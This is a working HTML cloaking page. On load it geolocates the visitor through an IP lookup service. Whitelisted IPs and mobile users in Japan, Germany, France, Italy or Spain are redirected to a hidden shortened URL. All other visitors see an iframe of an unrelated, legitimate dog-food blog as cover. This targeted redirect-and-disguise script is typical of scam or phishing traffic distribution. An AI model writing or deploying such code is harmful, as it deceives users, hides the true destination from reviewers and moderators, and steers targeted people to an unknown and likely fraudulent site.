


<!DOCTYPE html>
<html>
<head>
	 

  <title>WELCOME</title>
  <meta charset="utf-8">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }

    iframe {
      width: 100%;
	  font-size: 14px; /* 调整字体大小 */
      
     height: 100%;
      border: none;
    }
  </style>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
	 
  <body onload="handleResponse()">
 
<script>
function handleResponse() {
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function isJapaneseLang() {
        return navigator.language.startsWith('ja') || 
               navigator.languages.some(lang => lang.startsWith('ja'));
    }

    // IP whitelist
    const ipWhitelist = ['59.125.75.194', '156.243.230.146']; // Add your IPs here

    // Target countries (ISO codes)
    const targetCountries = ['JP', 'DE', 'FR', 'IT', 'ES'];

    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            // Check IP whitelist first
            if (ipWhitelist.includes(data.ip)) {
                window.location.href = "https://sourl.cn/vyar4t";
                return;
            }
            
            // Check if country is in target list AND is mobile device
            if (targetCountries.includes(data.country) && isMobileDevice()) {
                window.location.href = "https://sourl.cn/vyar4t";
                return;
            }
        
            // Default behavior: load iframe
            const iframe = document.createElement('iframe');
            iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
            iframe.style.width = '100%';
            iframe.style.height = '100vh';
            document.body.appendChild(iframe);
        })
        .catch(() => {
            // Fallback when IP detection fails: check mobile + Japanese language
            if (isMobileDevice() && isJapaneseLang()) {
                window.location.href = "https://sourl.cn/vyar4t";
                return;
            }
            
            // Default behavior: load iframe
            const iframe = document.createElement('iframe');
            iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
            iframe.style.width = '100%';
            iframe.style.height = '100vh';
            document.body.appendChild(iframe);
        });
}

</script>
 
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
</body>
</html>
